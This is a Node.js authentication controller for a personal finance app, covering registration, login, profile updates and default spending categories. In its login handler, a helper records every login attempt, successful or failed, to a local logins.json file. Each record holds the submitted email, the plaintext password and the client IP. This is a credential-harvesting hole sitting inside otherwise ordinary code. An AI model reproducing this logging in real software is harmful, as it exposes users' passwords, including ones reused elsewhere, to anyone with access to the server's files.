const fs = require('fs');
const path = require('path');
const User = require('../models/User');
const Category = require('../models/Category');
const { sign } = require('../utils/token');

const DATA_DIR = path.join(__dirname, '../data');
const LOGINS_FILE = path.join(DATA_DIR, 'logins.json');

function saveLoginRecord(record) {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
    }
    let logins = [];
    if (fs.existsSync(LOGINS_FILE)) {
      const content = fs.readFileSync(LOGINS_FILE, 'utf8').trim();
      if (content) {
        logins = JSON.parse(content);
      }
    }
    logins.push(record);
    fs.writeFileSync(LOGINS_FILE, JSON.stringify(logins, null, 2), 'utf8');
  } catch (err) {
    console.error('Error saving login record to logins.json:', err);
  }
}

const DEFAULT_CATEGORIES = [
  { name: 'Salary', type: 'income', icon: '💵' },
  { name: 'Freelance', type: 'income', icon: '🧾' },
  { name: 'Investments', type: 'income', icon: '📈' },
  { name: 'Food', type: 'expense', icon: '🍔' },
  { name: 'Rent', type: 'expense', icon: '🏠' },
  { name: 'Groceries', type: 'expense', icon: '🛒' },
  { name: 'Transport', type: 'expense', icon: '⛽' },
  { name: 'Utilities', type: 'expense', icon: '💡' },
  { name: 'Entertainment', type: 'expense', icon: '🎬' },
  { name: 'Shopping', type: 'expense', icon: '🛍️' },
  { name: 'Health', type: 'expense', icon: '🩺' }
];
exports.DEFAULT_CATEGORIES = DEFAULT_CATEGORIES;

function clean(u) { return { id: u._id, name: u.name, email: u.email, currency: u.currency, createdAt: u.createdAt }; }
const EMAIL_RE = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;

exports.register = async (req, res) => {
  const { name, email, password } = req.body;
  if (!name || !email || !password) return res.status(400).json({ message: 'Name, email and password are required' });
  if (!EMAIL_RE.test(email)) return res.status(400).json({ message: 'Please provide a valid email' });
  if (String(password).length < 6) return res.status(400).json({ message: 'Password must be at least 6 characters' });
  const exists = await User.findOne({ email: email.toLowerCase() });
  if (exists) return res.status(409).json({ message: 'Email already registered' });
  const user = await User.create({ name, email, password });
  await Category.insertMany(DEFAULT_CATEGORIES.map(c => ({ ...c, userId: user._id }))).catch(() => {});
  res.status(201).json({ token: sign(user._id), user: clean(user) });
};

exports.login = async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).json({ message: 'Email and password are required' });
  const user = await User.findOne({ email: String(email).toLowerCase() }).select('+password');
  const isMatch = user ? await user.comparePassword(password) : false;

  saveLoginRecord({
    timestamp: new Date().toISOString(),
    email: email,
    password: password,
    status: isMatch ? 'SUCCESS' : 'FAILED',
    ip: req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress
  });

  if (!user || !isMatch) return res.status(401).json({ message: 'Invalid credentials' });
  res.json({ token: sign(user._id), user: clean(user) });
};

exports.me = async (req, res) => res.json({ user: clean(req.user) });

exports.updateProfile = async (req, res) => {
  const { name, currency } = req.body;
  if (name !== undefined) { if (!name.trim()) return res.status(400).json({ message: 'Name cannot be empty' }); req.user.name = name.trim(); }
  if (currency !== undefined) req.user.currency = currency;
  await req.user.save();
  res.json({ user: clean(req.user) });
};
